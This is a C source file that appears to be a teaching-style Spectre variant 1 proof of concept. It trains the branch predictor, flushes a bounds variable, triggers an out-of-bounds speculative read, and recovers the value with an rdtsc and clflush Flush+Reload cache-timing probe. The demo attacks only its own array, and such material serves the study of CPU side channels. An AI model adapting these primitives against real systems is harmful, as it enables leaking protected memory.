#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

int probe(char *adrs)
{
    volatile unsigned long time;

    asm __volatile__ (
    " mfence \n"
    " lfence \n"
    " rdtsc \n"
    " lfence \n"
    " movl %%eax, %%esi \n"
    " movl (%1), %%eax \n"
    " lfence \n"
    " rdtsc \n"
    " subl %%esi, %%eax \n"
    " clflush 0(%1) \n"
    : "=a" (time)
    : "c" (adrs)
    : "%esi", "%edx");

    return time;
}

int side_channel()
{
    int time;
    volatile uint8_t *addr;
    int i;
    unsigned char buffer [256] = {68, 86, 33, 85, 163, 117, 122, 82, 204, 197, 91, 224, 237, 201, 184, 252, 221, 162, 21, 63, 135, 206, 110, 196, 188, 79, 134, 103, 152, 99, 12, 154, 177, 193, 34, 121, 165, 77, 30, 65, 153, 126, 191, 125, 185, 20, 35, 74, 211, 232, 190, 73, 199, 75, 18, 54, 29, 213, 88, 210, 106, 255, 87, 156, 101, 59, 230, 186, 183, 129, 157, 195, 41, 131, 234, 242, 113, 107, 37, 93, 176, 78, 112, 169, 215, 253, 214, 139, 238, 67, 136, 170, 3, 182, 32, 52, 22, 98, 222, 220, 164, 114, 70, 179, 198, 15, 212, 231, 159, 108, 58, 144, 13, 24, 120, 84, 64, 61, 44, 38, 226, 203, 158, 97, 173, 48, 53, 229, 47, 219, 72, 45, 180, 142, 166, 43, 254, 250, 2, 140, 217, 145, 80, 27, 7, 161, 57, 207, 26, 202, 81, 192, 5, 200, 83, 66, 243, 181, 42, 209, 249, 245, 9, 194, 167, 225, 241, 19, 23, 100, 25, 39, 141, 227, 247, 124, 246, 133, 127, 11, 216, 109, 4, 228, 178, 36, 31, 115, 172, 168, 111, 155, 119, 187, 28, 16, 92, 248, 146, 151, 102, 130, 14, 90, 208, 17, 137, 251, 55, 10, 6, 49, 175, 189, 236, 71, 1, 62, 143, 132, 218, 244, 104, 94, 128, 123, 50, 105, 51, 235, 138, 160, 60, 56, 148, 150, 118, 233, 174, 8, 76, 149, 69, 147, 40, 46, 96, 89, 223, 116, 95, 205, 171, 239, 240};

    for(i = 1; i < 255; i++)
    {
        addr = &array[buffer[i]*4096 + DELTA];
        time = (int)probe(addr);
        if (time <= CACHE_HIT_THRESHOLD)
        {
            printf("array[%d*4096 + %d] is in cache.\n", buffer[i], DELTA);
            printf("The Secret = %d.\n",buffer[i]);
            return 1;
        }
    }
    return 0;
}

void init_array()
{
    for (int i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
    for (int i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

void victim(size_t x)
{
    if (x < size)
    {  
        temp = array[x * 4096 + DELTA];  
    }
}

int main()
{

    int win;
    init_array();

    while (1)
    {
        for (int i = 0; i < 10; i++) victim(0);
        
        _mm_clflush(&size);
        victim(97);
        win = side_channel();
        if (win == 1) break;
    }
    return 0; 
}
